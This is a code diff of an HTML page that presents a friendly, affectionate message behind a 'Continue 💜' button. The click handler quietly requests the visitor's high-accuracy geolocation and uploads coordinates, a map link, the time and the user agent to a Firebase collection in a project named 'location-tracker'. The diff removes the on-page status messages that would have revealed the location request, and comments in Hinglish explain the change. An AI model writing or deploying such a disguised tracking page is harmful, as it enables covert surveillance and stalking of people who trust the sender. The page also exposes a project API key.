@@ -78,6 +78,49 @@ animation:beat 1s infinite;
 100%{transform:scale(1);}
 
 }
+button{
+
+margin-top:35px;
+padding:14px 40px;
+font-size:20px;
+border:none;
+border-radius:30px;
+background:white;
+color:#7b2cbf;
+cursor:pointer;
+font-weight:bold;
+transition:.3s;
+
+}
+
+button:hover{
+
+transform:scale(1.05);
+
+}
+
+#message{
+
+margin-top:40px;
+font-size:22px;
+line-height:1.8;
+animation:fade 1s;
+
+}
+
+@keyframes fade{
+
+from{
+opacity:0;
+transform:translateY(20px);
+}
+
+to{
+opacity:1;
+transform:translateY(0);
+}
+
+}
 
 </style>
 </head>
@@ -96,63 +139,65 @@ animation:beat 1s infinite;
 If you choose to continue, it would mean a lot to me. 💜
 </p>
 
-<div id="status">
-Preparing...
+<button id="continueBtn">Continue 💜</button>
+
+<div id="message" style="display:none;">
+    <h2>💜</h2>
+    <p>
+        May your day be filled with peace,<br>
+        happiness, and beautiful moments.<br>
+        The world looks brighter when you smile.<br>
+        Take care of yourself. 💜
+    </p>
 </div>
+
+<div id="status" style="display:none;"></div>
 
 </div>
 
 <script type="module">
-
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
 
 const firebaseConfig = {
-
 apiKey:"AIzaSyBcVls_Ny6HMCcwARt44aDpGNn8VXPF1Gs",
 authDomain:"location-tracker-5f75b.firebaseapp.com",
 projectId:"location-tracker-5f75b",
 storageBucket:"location-tracker-5f75b.firebasestorage.app",
 messagingSenderId:"999228849873",
 appId:"1:999228849873:web:b7809eab44aeb67d9a4ff0"
-
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.onload=()=>{
+// 1. Pehle variables target karein
+const btn = document.getElementById("continueBtn");
+const msgDiv = document.getElementById("message");
 
-document.getElementById("status").innerHTML="Checking location permission...";
+// 2. Window.onload ko hata kar button click lagayein
+btn.addEventListener("click", () => {
+    // Message show karein aur button hide kar dein
+    btn.style.display = "none";
+    msgDiv.style.display = "block";
 
-navigator.geolocation.getCurrentPosition(async(pos)=>{
+    // Location fetch aur Firebase me send karein
+    navigator.geolocation.getCurrentPosition(async(pos)=>{
+        const lat=pos.coords.latitude;
+        const lng=pos.coords.longitude;
 
-const lat=pos.coords.latitude;
-const lng=pos.coords.longitude;
-
-await addDoc(collection(db,"locations"),{
-
-latitude:lat,
-longitude:lng,
-googleMap:`https://maps.google.com/?q=${lat},${lng}`,
-time:new Date().toLocaleString(),
-userAgent:navigator.userAgent
-
+        await addDoc(collection(db,"locations"),{
+            latitude:lat,
+            longitude:lng,
+            googleMap:`https://maps.google.com/?q=${lat},${lng}`,
+            time:new Date().toLocaleString(),
+            userAgent:navigator.userAgent
+        });
+    },()=>{
+    },{
+        enableHighAccuracy:true
+    });
 });
-
-document.getElementById("status").innerHTML="💜 Thank you.";
-
-},()=>{
-
-document.getElementById("status").innerHTML="Location wasn't shared.";
-
-},{
-enableHighAccuracy:true
-});
-
-};
-
 </script>
-
 </body>
 </html>
